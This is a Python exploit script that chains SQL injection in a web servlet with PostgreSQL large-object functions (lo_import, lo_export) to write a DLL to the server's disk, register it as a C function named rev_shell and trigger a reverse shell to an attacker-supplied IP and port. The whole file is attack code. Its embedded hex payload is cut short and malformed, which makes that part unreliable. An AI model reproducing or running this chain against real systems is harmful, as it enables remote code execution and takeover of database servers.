import requests,  sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()

# hex encoded UDF rev_shell dll 192.168.1.1 32
udf = 4d5a90000300000004000000ffff0000b8000000000000'

loid = 1021

https_proxy  = "https://127.0.0.1:8080"

proxyDict = { 
              "https" : https_proxy
            }

def log(msg):
    print msg
    
def make_request(url, sql):
    log("[*] Executing query: %s" % sql)
    r = requests.get( url % sql, verify=False, proxies=proxyDict)
    return r
 
def delete_lo(url):
    log("[+] Deleting existing LO...")
    sql = "SELECT lo_unlink((select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$MZ%25$$ LIMIT 1))"
    make_request(url, sql)

def create_lo(url):
    # initalize a LOID with a small object that fits in a single chunk allowing later enumeration of the loid 
    log("[+] Creating LO for UDF injection...")
    sql = "SELECT lo_import($$C:\\windows\\win.ini$$)"
    make_request(url, sql)
    
def inject_udf(url):
    log("[+] Injecting payload of length %d into LO..." % len(udf))
    for i in range(0,int(round(len(udf)/4096))):    
        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            # nested query for loid returns loid where "; for%" text string is found from loading win.ini. This means win.ini is currently in the LOID which enumerates the loid so no pre-knowledge is required
            #Trick was escaping % with %25 for URL encoding and including addtional % in python only for those lines that use string formatting (well duh). 
            sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=(select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$; for%%25$$ LIMIT 1) and pageno=%d" % (udf_chunk, i)
        else:
            # nested query for loid returns loid where "MZ%" text string. This indicates the DDL UDF is loaded.
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ((select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$MZ%%25$$ LIMIT 1), %d,decode($$%s$$, $$hex$$))" % (i, udf_chunk)
        make_request(url, sql)
        
        
def export_udf(url):
    log("[+] Exporting UDF library to filesystem...")
    sql = "SELECT lo_export((select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$MZ%25$$ LIMIT 1), $$C:\\Users\\frank\\rev_shell.dll$$)"
    make_request(url, sql)

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\frank\\rev_shell.dll$$, $$connect_back$$ language C strict"
    make_request(url, sql)    
    
def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell...")
    sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
    make_request(url, sql)
    
if __name__ == '__main__':
    try:
        server = sys.argv[1].strip()
        attacker = sys.argv[2].strip()
        port = sys.argv[3].strip()
    except IndexError:
        print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
        sys.exit()
        
sqli_url = "https://"+server+"/testingServlet?userdata=1&userId=1;%s;--"
delete_lo(sqli_url)
create_lo(sqli_url)
inject_udf(sqli_url)
export_udf(sqli_url)
create_udf_func(sqli_url)
trigger_udf(sqli_url, attacker, port)
